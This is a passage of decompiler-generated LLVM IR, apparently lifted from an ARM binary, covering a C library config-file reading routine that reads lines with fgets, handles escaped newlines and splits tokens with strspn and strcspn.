dec_label_pc_15b50:
  %v0_15b50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15b50, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15b50
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15b50, %bb
  %v4_15b5c = phi i32 [ %arg1, %dec_label_pc_15b50 ], [ 0, %bb ]
  ret i32 %v4_15b5c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15b60 = load i32, i32* @r4, align 4
  %v6_15b60 = load i32, i32* @r5, align 4
  %v9_15b60 = load i32, i32* @r6, align 4
  %v12_15b60 = load i32, i32* @r7, align 4
  %v15_15b60 = load i32, i32* @r8, align 4
  %v18_15b60 = load i32, i32* @sb, align 4
  %v21_15b60 = load i32, i32* @sl, align 4
  %v24_15b60 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15b64 = icmp eq i32* %arg1, null
  store i1 %v2_15b64, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15b64, label %dec_label_pc_15e74, label %dec_label_pc_15b7c

dec_label_pc_15b7c:                               ; preds = %entry
  %v1_15b7c = urem i32 %arg3, 256
  store i32 %v1_15b7c, i32* @sb, align 4
  %v1_15b80 = udiv i32 %arg3, 256
  %v3_15b84 = urem i32 %v1_15b80, 256
  %v3_15b88 = mul nuw nsw i32 %v1_15b7c, 4
  %v1_15b90 = or i32 %v3_15b88, 1
  %v1_15b9c = and i32 %arg3, 131072
  %v1_15ba0 = add nsw i32 %v1_15b7c, -1
  %v1_15bac = and i32 %arg3, 262144
  store i32 %v1_15bac, i32* %r2.global-to-local, align 4
  %v1_15bb0 = and i32 %arg3, 65536
  store i32 %v1_15bb0, i32* %r3.global-to-local, align 4
  store i32 %v1_15bb0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15bc0 = add i32 %arg4, 1
  store i32 %v1_15bc0, i32* @sl, align 4
  %v2_15d38 = icmp eq i32 %v1_15b9c, 0
  %v1_15d90 = inttoptr i32 %arg2 to i32*
  %v2_15da8 = icmp eq i32 %v1_15bac, 0
  br label %dec_label_pc_15bc4

dec_label_pc_15bc4:                               ; preds = %dec_label_pc_15bc4.backedge, %dec_label_pc_15b7c
  %v2_15be0 = phi i32 [ %v0_15bc4.pre, %dec_label_pc_15bc4.backedge ], [ %tmp, %dec_label_pc_15b7c ]
  %v1_15bc4 = add i32 %v2_15be0, 4
  %v2_15bc4 = inttoptr i32 %v1_15bc4 to i32*
  %v3_15bc4 = load i32, i32* %v2_15bc4, align 4
  store i32 %v3_15bc4, i32* %r3.global-to-local, align 4
  %v2_15bc8 = icmp eq i32 %v3_15bc4, 0
  store i1 %v2_15bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bc8, label %dec_label_pc_15bd0, label %dec_label_pc_15c18

dec_label_pc_15bd0:                               ; preds = %dec_label_pc_15bc4
  %v1_15bd0 = add i32 %v2_15be0, 16
  %v2_15bd0 = inttoptr i32 %v1_15bd0 to i32*
  %v3_15bd0 = load i32, i32* %v2_15bd0, align 4
  store i32 %v3_15bd0, i32* %r3.global-to-local, align 4
  %v2_15bd4 = icmp eq i32 %v3_15bd0, 0
  store i1 %v2_15bd4, i1* %cpsr_z.global-to-local, align 1
  %v1_15bd8 = add i32 %v2_15be0, 8
  %v2_15bd8 = inttoptr i32 %v1_15bd8 to i32*
  %v3_15bd8 = load i32, i32* %v2_15bd8, align 4
  store i32 %v3_15bd8, i32* %r3.global-to-local, align 4
  br i1 %v2_15bd4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_15bd0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_15bd0, align 4
  %v0_15be4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_15bd0, %bb
  %v0_15be4 = phi i32 [ %v0_15be4.pre, %bb ], [ %v3_15bd8, %dec_label_pc_15bd0 ]
  %v2_15be4 = icmp eq i32 %v0_15be4, 0
  store i1 %v2_15be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15be4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_15b90, i32* %r3.global-to-local, align 4
  %v2_15bec = load i32, i32* @r5, align 4
  %v3_15bec = add i32 %v2_15bec, 8
  %v4_15bec = inttoptr i32 %v3_15bec to i32*
  store i32 %v1_15b90, i32* %v4_15bec, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_15bf0 = load i32, i32* @r5, align 4
  %v1_15bf0 = add i32 %v0_15bf0, 16
  %v2_15bf0 = inttoptr i32 %v1_15bf0 to i32*
  %v3_15bf0 = load i32, i32* %v2_15bf0, align 4
  store i32 %v3_15bf0, i32* %r0.global-to-local, align 4
  %v1_15bf4 = add i32 %v0_15bf0, 8
  %v2_15bf4 = inttoptr i32 %v1_15bf4 to i32*
  %v3_15bf4 = load i32, i32* %v2_15bf4, align 4
  store i32 %v3_15bf4, i32* %r3.global-to-local, align 4
  %v2_15bf8 = add i32 %v3_15bf4, %v3_15bf0
  store i32 %v2_15bf8, i32* @r0, align 4
  %v0_15bfc = call i32 @malloc()
  store i32 %v0_15bfc, i32* %r0.global-to-local, align 4
  %v2_15c00 = icmp eq i32 %v0_15bfc, 0
  store i1 %v2_15c00, i1* %cpsr_z.global-to-local, align 1
  %v1_15c04 = load i32, i32* @r5, align 4
  %v2_15c04 = add i32 %v1_15c04, 4
  %v3_15c04 = inttoptr i32 %v2_15c04 to i32*
  store i32 %v0_15bfc, i32* %v3_15c04, align 4
  br i1 %v2_15c00, label %dec_label_pc_15e74, label %dec_label_pc_15c0c

dec_label_pc_15c0c:                               ; preds = %.thread
  %v0_15c0c = load i32, i32* @r5, align 4
  %v1_15c0c = add i32 %v0_15c0c, 20
  %v2_15c0c = inttoptr i32 %v1_15c0c to i32*
  %v3_15c0c = load i32, i32* %v2_15c0c, align 4
  %v1_15c10 = or i32 %v3_15c0c, 1
  store i32 %v1_15c10, i32* %r3.global-to-local, align 4
  store i32 %v1_15c10, i32* %v2_15c0c, align 4
  %v0_15c18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15c18

dec_label_pc_15c18:                               ; preds = %dec_label_pc_15bc4, %dec_label_pc_15c0c
  %v1_15c20 = phi i32 [ %v2_15be0, %dec_label_pc_15bc4 ], [ %v0_15c18.pre, %dec_label_pc_15c0c ]
  %v1_15c18 = add i32 %v1_15c20, 4
  %v2_15c18 = inttoptr i32 %v1_15c18 to i32*
  %v3_15c18 = load i32, i32* %v2_15c18, align 4
  store i32 %v3_15c18, i32* %r2.global-to-local, align 4
  %v4_15c18 = add i32 %v1_15c20, 8
  %v5_15c18 = inttoptr i32 %v4_15c18 to i32*
  %v6_15c18 = load i32, i32* %v5_15c18, align 4
  %v2_15c1c = add i32 %v6_15c18, %v3_15c18
  store i32 %v2_15c1c, i32* %r3.global-to-local, align 4
  %v2_15c20 = add i32 %v1_15c20, 12
  %v3_15c20 = inttoptr i32 %v2_15c20 to i32*
  store i32 %v2_15c1c, i32* %v3_15c20, align 4
  %v0_15c24 = load i32, i32* @fp, align 4
  store i32 %v0_15c24, i32* @r6, align 4
  br label %dec_label_pc_15c28

dec_label_pc_15c28:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15ca0, %dec_label_pc_15c18
  %v0_15c30 = phi i32 [ %v0_15c24, %dec_label_pc_15c18 ], [ %v1_15ca0, %dec_label_pc_15ca0 ], [ %v0_15c30.pre.pre, %dec_label_pc_15cb4 ]
  %v0_15c28 = load i32, i32* @r5, align 4
  %v1_15c28 = add i32 %v0_15c28, 12
  store i32 %v1_15c28, i32* %r0.global-to-local, align 4
  %v1_15c2c = inttoptr i32 %v1_15c28 to i32*
  %v2_15c2c = load i32, i32* %v1_15c2c, align 4
  store i32 %v2_15c2c, i32* %r0.global-to-local, align 4
  %v3_15c2c = add i32 %v0_15c28, 16
  %v4_15c2c = inttoptr i32 %v3_15c2c to i32*
  %v5_15c2c = load i32, i32* %v4_15c2c, align 4
  %v2_15c30 = add i32 %v2_15c2c, %v0_15c30
  store i32 %v2_15c30, i32* %r0.global-to-local, align 4
  %v2_15c34 = sub i32 %v5_15c2c, %v0_15c30
  %v1_15c38 = inttoptr i32 %v0_15c28 to i32*
  %v2_15c38 = load i32, i32* %v1_15c38, align 4
  store i32 %v2_15c38, i32* %r2.global-to-local, align 4
  %v3_15c3c = call i32 @fgets(i32 %v2_15c30, i32 %v2_15c34, i32 %v2_15c38)
  store i32 %v3_15c3c, i32* %r0.global-to-local, align 4
  store i32 %v3_15c3c, i32* %r4.global-to-local, align 4
  %v2_15c40 = icmp eq i32 %v3_15c3c, 0
  store i1 %v2_15c40, i1* %cpsr_z.global-to-local, align 1
  %v0_15c48 = load i32, i32* @r5, align 4
  %v1_15c48 = add i32 %v0_15c48, 12
  br i1 %v2_15c40, label %dec_label_pc_15c48, label %dec_label_pc_15c60

dec_label_pc_15c48:                               ; preds = %dec_label_pc_15c28
  store i32 %v1_15c48, i32* %r0.global-to-local, align 4
  %v1_15c4c = inttoptr i32 %v1_15c48 to i32*
  %v2_15c4c = load i32, i32* %v1_15c4c, align 4
  store i32 %v2_15c4c, i32* %r0.global-to-local, align 4
  %v3_15c4c = add i32 %v0_15c48, 16
  %v4_15c4c = inttoptr i32 %v3_15c4c to i32*
  %v5_15c4c = load i32, i32* %v4_15c4c, align 4
  store i32 %v5_15c4c, i32* %r2.global-to-local, align 4
  %v3_15c54 = inttoptr i32 %v2_15c4c to i8*
  %v4_15c54 = call i32 @__GI_memset(i8* %v3_15c54, i32 0, i32 %v5_15c4c)
  store i32 %v4_15c54, i32* %r0.global-to-local, align 4
  %v0_15c58 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15e78

dec_label_pc_15c60:                               ; preds = %dec_label_pc_15c28
  %v2_15c60 = inttoptr i32 %v1_15c48 to i32*
  %v3_15c60 = load i32, i32* %v2_15c60, align 4
  store i32 %v3_15c60, i32* @r4, align 4
  %v1_15c64 = load i32, i32* @r6, align 4
  %v2_15c64 = add i32 %v1_15c64, %v3_15c60
  %v3_15c64 = inttoptr i32 %v2_15c64 to i8*
  store i32 %v2_15c64, i32* %r0.global-to-local, align 4
  %v3_15c68 = call i32 @strlen(i8* %v3_15c64)
  %v0_15c70 = load i32, i32* @r6, align 4
  %v2_15c70 = add i32 %v0_15c70, %v3_15c68
  store i32 %v2_15c70, i32* @r6, align 4
  %v0_15c74 = load i32, i32* @r4, align 4
  store i32 %v0_15c74, i32* @r0, align 4
  %v2_15c78 = call i32 @__GI_strchr(i32 %v0_15c74, i32 10)
  store i32 %v2_15c78, i32* %r0.global-to-local, align 4
  %v2_15c7c = icmp eq i32 %v2_15c78, 0
  store i1 %v2_15c7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15c7c, label %dec_label_pc_15ca8, label %dec_label_pc_15c84

dec_label_pc_15c84:                               ; preds = %dec_label_pc_15c60
  %v1_15c84 = inttoptr i32 %v2_15c78 to i8*
  %v2_15c84 = load i8, i8* %v1_15c84, align 1
  %v3_15c84 = zext i8 %v2_15c84 to i32
  %v1_15c88 = add nuw nsw i32 %v3_15c84, 255
  %v1_15c8c = urem i32 %v1_15c88, 256
  store i32 %v1_15c8c, i32* %r3.global-to-local, align 4
  %v7_15c90 = icmp eq i32 %v1_15c8c, 92
  store i1 %v7_15c90, i1* %cpsr_z.global-to-local, align 1
  %v1_15c94 = trunc i32 %v1_15c88 to i8
  store i8 %v1_15c94, i8* %v1_15c84, align 1
  %v0_15c98 = load i32, i32* @r6, align 4
  %v1_15c98 = add i32 %v0_15c98, -1
  store i32 %v1_15c98, i32* @r6, align 4
  %v0_15c9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15c9c, label %dec_label_pc_15ca0, label %dec_label_pc_15d2c

dec_label_pc_15ca0:                               ; preds = %dec_label_pc_15c84
  %v1_15ca0 = add i32 %v0_15c98, -2
  store i32 %v1_15ca0, i32* @r6, align 4
  br label %dec_label_pc_15c28

dec_label_pc_15ca8:                               ; preds = %dec_label_pc_15c60
  %v0_15ca8 = load i32, i32* @r5, align 4
  %v1_15ca8 = add i32 %v0_15ca8, 20
  %v2_15ca8 = inttoptr i32 %v1_15ca8 to i32*
  %v3_15ca8 = load i32, i32* %v2_15ca8, align 4
  store i32 %v3_15ca8, i32* %r3.global-to-local, align 4
  %v2_15cac = icmp eq i32 %v3_15ca8, 0
  store i1 %v2_15cac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cac, label %dec_label_pc_15ce4, label %dec_label_pc_15cb4

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15ca8
  %v1_15cb4 = add i32 %v0_15ca8, 16
  %v2_15cb4 = inttoptr i32 %v1_15cb4 to i32*
  %v3_15cb4 = load i32, i32* %v2_15cb4, align 4
  store i32 %v3_15cb4, i32* %r3.global-to-local, align 4
  %v1_15cb8 = add i32 %v0_15ca8, 8
  %v2_15cb8 = inttoptr i32 %v1_15cb8 to i32*
  %v3_15cb8 = load i32, i32* %v2_15cb8, align 4
  %v1_15cbc = add i32 %v3_15cb4, 4096
  store i32 %v1_15cbc, i32* %r3.global-to-local, align 4
  %v2_15cc0 = add i32 %v3_15cb8, %v1_15cbc
  store i32 %v1_15cbc, i32* %v2_15cb4, align 4
  %v0_15cc8 = load i32, i32* @r5, align 4
  %v1_15cc8 = add i32 %v0_15cc8, 4
  %v2_15cc8 = inttoptr i32 %v1_15cc8 to i32*
  %v3_15cc8 = load i32, i32* %v2_15cc8, align 4
  store i32 %v3_15cc8, i32* %r0.global-to-local, align 4
  %v4_15ccc = inttoptr i32 %v3_15cc8 to i32*
  %v5_15ccc = call i32 @realloc(i32* %v4_15ccc, i32 %v2_15cc0, i32 %v2_15c38, i32 %v1_15cbc)
  store i32 %v5_15ccc, i32* %r0.global-to-local, align 4
  %v0_15cd0 = load i32, i32* @r5, align 4
  %v1_15cd0 = add i32 %v0_15cd0, 8
  %v2_15cd0 = inttoptr i32 %v1_15cd0 to i32*
  %v3_15cd0 = load i32, i32* %v2_15cd0, align 4
  %v2_15cd4 = add i32 %v3_15cd0, %v5_15ccc
  store i32 %v2_15cd4, i32* %r3.global-to-local, align 4
  %v2_15cd8 = add i32 %v0_15cd0, 12
  %v3_15cd8 = inttoptr i32 %v2_15cd8 to i32*
  store i32 %v2_15cd4, i32* %v3_15cd8, align 4
  %v1_15cdc = load i32, i32* @r5, align 4
  %v2_15cdc = add i32 %v1_15cdc, 4
  %v3_15cdc = inttoptr i32 %v2_15cdc to i32*
  store i32 %v5_15ccc, i32* %v3_15cdc, align 4
  %v0_15c30.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15c28

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15ca8, %.dec_label_pc_15ce4_crit_edge
  %v0_15ce4 = phi i32 [ %v0_15ce4.pre, %.dec_label_pc_15ce4_crit_edge ], [ %v0_15ca8, %dec_label_pc_15ca8 ]
  %v1_15ce4 = inttoptr i32 %v0_15ce4 to i32*
  %v2_15ce4 = load i32, i32* %v1_15ce4, align 4
  store i32 %v2_15ce4, i32* @r1, align 4
  %v1_15ce8 = add i32 %v2_15ce4, 52
  %v2_15ce8 = inttoptr i32 %v1_15ce8 to i32*
  %v3_15ce8 = load i32, i32* %v2_15ce8, align 4
  store i32 %v3_15ce8, i32* %r3.global-to-local, align 4
  %v2_15cec = icmp eq i32 %v3_15ce8, 0
  store i1 %v2_15cec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cec, label %dec_label_pc_15d18, label %dec_label_pc_15cf4

dec_label_pc_15cf4:                               ; preds = %dec_label_pc_15ce4
  %v1_15cf4 = add i32 %v2_15ce4, 16
  %v2_15cf4 = inttoptr i32 %v1_15cf4 to i32*
  %v3_15cf4 = load i32, i32* %v2_15cf4, align 4
  store i32 %v3_15cf4, i32* %r2.global-to-local, align 4
  %v1_15cf8 = add i32 %v2_15ce4, 24
  %v2_15cf8 = inttoptr i32 %v1_15cf8 to i32*
  %v3_15cf8 = load i32, i32* %v2_15cf8, align 4
  store i32 %v3_15cf8, i32* %r3.global-to-local, align 4
  %v3_15cfc = icmp ult i32 %v3_15cf4, %v3_15cf8
  %v9_15cfc = icmp eq i32 %v3_15cf4, %v3_15cf8
  store i1 %v9_15cfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15cfc, label %dec_label_pc_15d20thread-pre-split, label %dec_label_pc_15d0c

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cf4
  store i32 %v2_15ce4, i32* %r0.global-to-local, align 4
  %v1_15d10 = inttoptr i32 %v2_15ce4 to i16*
  %v2_15d10 = call i32 @getc_unlocked(i16* %v1_15d10)
  store i32 %v2_15d10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d20

dec_label_pc_15d18:                               ; preds = %dec_label_pc_15ce4
  store i32 %v2_15ce4, i32* %r0.global-to-local, align 4
  %v1_15d1c = call i32 @__GI_fgetc(i32 %v2_15ce4)
  store i32 %v1_15d1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d20

dec_label_pc_15d20thread-pre-split:               ; preds = %dec_label_pc_15cf4
  %v2_15d00 = inttoptr i32 %v3_15cf4 to i8*
  %v3_15d00 = load i8, i8* %v2_15d00, align 1
  %v4_15d00 = zext i8 %v3_15d00 to i32
  store i32 %v4_15d00, i32* %r0.global-to-local, align 4
  %v6_15d00 = add i32 %v3_15cf4, 1
  store i32 %v6_15d00, i32* %r2.global-to-local, align 4
  store i32 %v6_15d00, i32* %v2_15cf4, align 4
  %v0_15d20.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d20thread-pre-split, %dec_label_pc_15d0c, %dec_label_pc_15d18
  %v1_15d24 = phi i32 [ %v0_15d20.pr, %dec_label_pc_15d20thread-pre-split ], [ %v2_15d10, %dec_label_pc_15d0c ], [ %v1_15d1c, %dec_label_pc_15d18 ]
  %v7_15d20 = icmp eq i32 %v1_15d24, 10
  store i1 %v7_15d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d20, label %dec_label_pc_15d2c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_15d20
  %v8_15d24 = icmp eq i32 %v1_15d24, -1
  store i1 %v8_15d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_15d24, label %dec_label_pc_15d2c.loopexit, label %.dec_label_pc_15ce4_crit_edge

.dec_label_pc_15ce4_crit_edge:                    ; preds = %bb66
  %v0_15ce4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15ce4

dec_label_pc_15d2c.loopexit:                      ; preds = %bb66, %dec_label_pc_15d20
  %v0_15d2c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15d2c

dec_label_pc_15d2c:                               ; preds = %dec_label_pc_15c84, %dec_label_pc_15d2c.loopexit
  %v0_15d2c = phi i32 [ %v0_15d2c.pre, %dec_label_pc_15d2c.loopexit ], [ %v1_15c98, %dec_label_pc_15c84 ]
  %v7_15d2c = icmp eq i32 %v0_15d2c, -1
  store i1 %v7_15d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15d2c, label %dec_label_pc_15e74, label %dec_label_pc_15d34

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d2c
  store i32 %v1_15b9c, i32* %r3.global-to-local, align 4
  store i1 %v2_15d38, i1* %cpsr_z.global-to-local, align 1
  %v0_15d3c = load i32, i32* @r5, align 4
  %v1_15d3c = add i32 %v0_15d3c, 12
  %v2_15d3c = inttoptr i32 %v1_15d3c to i32*
  %v3_15d3c = load i32, i32* %v2_15d3c, align 4
  store i32 %v3_15d3c, i32* @r4, align 4
  br i1 %v2_15d38, label %dec_label_pc_15d54, label %dec_label_pc_15d44

dec_label_pc_15d44:                               ; preds = %dec_label_pc_15d34
  store i32 %v3_15d3c, i32* @r0, align 4
  %v0_15d48 = load i32, i32* @sl, align 4
  %v2_15d4c = inttoptr i32 %v3_15d3c to i8*
  %v3_15d4c = call i32 @__GI_strspn(i8* %v2_15d4c, i32 %v0_15d48)
  store i32 %v3_15d4c, i32* %r0.global-to-local, align 4
  %v0_15d50 = load i32, i32* @r4, align 4
  %v2_15d50 = add i32 %v0_15d50, %v3_15d4c
  store i32 %v2_15d50, i32* @r4, align 4
  br label %dec_label_pc_15d54

dec_label_pc_15d54:                               ; preds = %dec_label_pc_15d34, %dec_label_pc_15d44
  %v0_15d54 = phi i32 [ %v3_15d3c, %dec_label_pc_15d34 ], [ %v2_15d50, %dec_label_pc_15d44 ]
  %v1_15d54 = inttoptr i32 %v0_15d54 to i8*
  %v2_15d54 = load i8, i8* %v1_15d54, align 1
  %v3_15d54 = zext i8 %v2_15d54 to i32
  store i32 %v3_15d54, i32* %r2.global-to-local, align 4
  %v2_15d58 = icmp eq i8 %v2_15d54, 0
  store i1 %v2_15d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15d58, label %dec_label_pc_15bc4.backedge, label %dec_label_pc_15d60

dec_label_pc_15bc4.backedge:                      ; preds = %dec_label_pc_15d54, %dec_label_pc_15d60, %dec_label_pc_15e6c
  %v0_15bc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15bc4

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15d54
  %v0_15d60 = load i32, i32* @r7, align 4
  %v1_15d60 = inttoptr i32 %v0_15d60 to i8*
  %v2_15d60 = load i8, i8* %v1_15d60, align 1
  %v3_15d60 = zext i8 %v2_15d60 to i32
  store i32 %v3_15d60, i32* %r3.global-to-local, align 4
  %v9_15d64 = icmp eq i8 %v2_15d60, %v2_15d54
  store i1 %v9_15d64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15d64, label %dec_label_pc_15bc4.backedge, label %dec_label_pc_15d6c

dec_label_pc_15d6c:                               ; preds = %dec_label_pc_15d60
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_15d70 = load i32, i32* @r5, align 4
  %v1_15d70 = add i32 %v0_15d70, 4
  %v2_15d70 = inttoptr i32 %v1_15d70 to i32*
  %v3_15d70 = load i32, i32* %v2_15d70, align 4
  store i32 %v3_15d70, i32* %r0.global-to-local, align 4
  %v0_15d74 = load i32, i32* @fp, align 4
  store i32 %v3_15d70, i32* %v1_15d90, align 4
  store i32 %v3_15b88, i32* %r2.global-to-local, align 4
  %v3_15d80 = inttoptr i32 %v3_15d70 to i8*
  %v4_15d80 = call i32 @__GI_memset(i8* %v3_15d80, i32 %v0_15d74, i32 %v3_15b88)
  store i32 %v4_15d80, i32* %r0.global-to-local, align 4
  %v0_15d84 = load i32, i32* @fp, align 4
  store i32 %v0_15d84, i32* @r6, align 4
  %v0_15e4412 = load i32, i32* @r4, align 4
  %v1_15e4413 = inttoptr i32 %v0_15e4412 to i8*
  %v2_15e4414 = load i8, i8* %v1_15e4413, align 1
  %v3_15e4415 = zext i8 %v2_15e4414 to i32
  store i32 %v3_15e4415, i32* %r2.global-to-local, align 4
  %v2_15e4816 = icmp eq i8 %v2_15e4414, 0
  store i1 %v2_15e4816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15e4816, label %dec_label_pc_15e60, label %dec_label_pc_15e50

dec_label_pc_15d8c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_15d90 = load i32, i32* %v1_15d90, align 4
  store i32 %v2_15d90, i32* %r3.global-to-local, align 4
  store i32 %v1_15ba0, i32* %r2.global-to-local, align 4
  %v9_15d98 = icmp eq i32 %v2_15d9c, %v1_15ba0
  store i1 %v9_15d98, i1* %cpsr_z.global-to-local, align 1
  %v5_15d9c = mul i32 %v2_15d9c, 4
  %v6_15d9c = add i32 %v2_15d90, %v5_15d9c
  %v7_15d9c = inttoptr i32 %v6_15d9c to i32*
  store i32 %v0_15d9c, i32* %v7_15d9c, align 4
  br i1 %v9_15d98, label %dec_label_pc_15da4, label %dec_label_pc_15db0

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d8c
  store i32 %v1_15bac, i32* %r3.global-to-local, align 4
  store i1 %v2_15da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15da8, label %dec_label_pc_15db0, label %dec_label_pc_15dd0

dec_label_pc_15db0:                               ; preds = %dec_label_pc_15da4, %dec_label_pc_15d8c
  %v0_15db0 = load i32, i32* @r7, align 4
  %v1_15db0 = inttoptr i32 %v0_15db0 to i8*
  %v2_15db0 = load i8, i8* %v1_15db0, align 1
  %v3_15db0 = zext i8 %v2_15db0 to i32
  store i32 %v3_15db0, i32* %r3.global-to-local, align 4
  %v2_15db4 = icmp eq i8 %v2_15db0, 0
  store i1 %v2_15db4, i1* %cpsr_z.global-to-local, align 1
  %v0_15db8 = load i32, i32* @r4, align 4
  store i32 %v0_15db8, i32* @r0, align 4
  %v1_15dbc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_15db4, i32 %v1_15dbc, i32 %v0_15db0
  store i32 %storemerge, i32* @r1, align 4
  %v0_15dc4 = call i32 @strcspn()
  store i32 %v0_15dc4, i32* %r0.global-to-local, align 4
  %v0_15dc8 = load i32, i32* @r4, align 4
  %v2_15dc8 = add i32 %v0_15dc8, %v0_15dc4
  store i32 %v2_15dc8, i32* @r4, align 4
  br label %dec_label_pc_15e08

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15da4
  %v0_15dd0 = load i32, i32* @r4, align 4
  store i32 %v0_15dd0, i32* @r0, align 4
  %v0_15dd4 = load i32, i32* @r7, align 4
  %v1_15dd4 = inttoptr i32 %v0_15dd4 to i8*
  %v2_15dd4 = load i8, i8* %v1_15dd4, align 1
  %v3_15dd4 = zext i8 %v2_15dd4 to i32
  %v5_15dd8 = call i32 @__GI_strchrnul(i32 %v0_15dd0, i32 %v3_15dd4, i32 %v1_15ba0, i32 %v1_15bac)
  store i32 %v5_15dd8, i32* %r0.global-to-local, align 4
  store i32 %v1_15b9c, i32* %r2.global-to-local, align 4
  store i1 %v2_15d38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_15dd8, i32* @r4, align 4
  br i1 %v2_15d38, label %dec_label_pc_15e08, label %dec_label_pc_15df4

dec_label_pc_15df0:                               ; preds = %dec_label_pc_15df4
  %v1_15df0 = add i32 %v0_15e08.pre, -1
  store i32 %v1_15df0, i32* @r4, align 4
  br label %dec_label_pc_15df4

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15dd0, %dec_label_pc_15df0
  %v0_15df4 = phi i32 [ %v1_15df0, %dec_label_pc_15df0 ], [ %v5_15dd8, %dec_label_pc_15dd0 ]
  %v1_15df4 = add i32 %v0_15df4, -1
  %v2_15df4 = inttoptr i32 %v1_15df4 to i8*
  %v3_15df4 = load i8, i8* %v2_15df4, align 1
  %v4_15df4 = zext i8 %v3_15df4 to i32
  %v0_15df8 = load i32, i32* @sl, align 4
  store i32 %v0_15df8, i32* @r0, align 4
  %v2_15dfc = call i32 @__GI_strchr(i32 %v0_15df8, i32 %v4_15df4)
  store i32 %v2_15dfc, i32* %r0.global-to-local, align 4
  %v2_15e00 = icmp eq i32 %v2_15dfc, 0
  store i1 %v2_15e00, i1* %cpsr_z.global-to-local, align 1
  %v0_15e08.pre = load i32, i32* @r4, align 4
  br i1 %v2_15e00, label %dec_label_pc_15e08, label %dec_label_pc_15df0

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15df4, %dec_label_pc_15dd0, %dec_label_pc_15db0
  %v3_15e14 = phi i32 [ %v5_15dd8, %dec_label_pc_15dd0 ], [ %v2_15dc8, %dec_label_pc_15db0 ], [ %v0_15e08.pre, %dec_label_pc_15df4 ]
  %v1_15e08 = inttoptr i32 %v3_15e14 to i8*
  %v2_15e08 = load i8, i8* %v1_15e08, align 1
  %v3_15e08 = zext i8 %v2_15e08 to i32
  store i32 %v3_15e08, i32* %r2.global-to-local, align 4
  %v0_15e0c = load i32, i32* @r7, align 4
  %v1_15e0c = inttoptr i32 %v0_15e0c to i8*
  %v2_15e0c = load i8, i8* %v1_15e0c, align 1
  %v3_15e0c = zext i8 %v2_15e0c to i32
  store i32 %v3_15e0c, i32* %r3.global-to-local, align 4
  %v9_15e10 = icmp eq i8 %v2_15e0c, %v2_15e08
  store i1 %v9_15e10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15e10, label %bb69, label %dec_label_pc_15e1c

bb69:                                             ; preds = %dec_label_pc_15e08
  %v1_15e14 = load i32, i32* @fp, align 4
  %v2_15e14 = trunc i32 %v1_15e14 to i8
  store i8 %v2_15e14, i8* %v1_15e08, align 1
  %v0_15e18.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15e18.pr, label %bb71, label %.dec_label_pc_15e1c_crit_edge

.dec_label_pc_15e1c_crit_edge:                    ; preds = %bb69
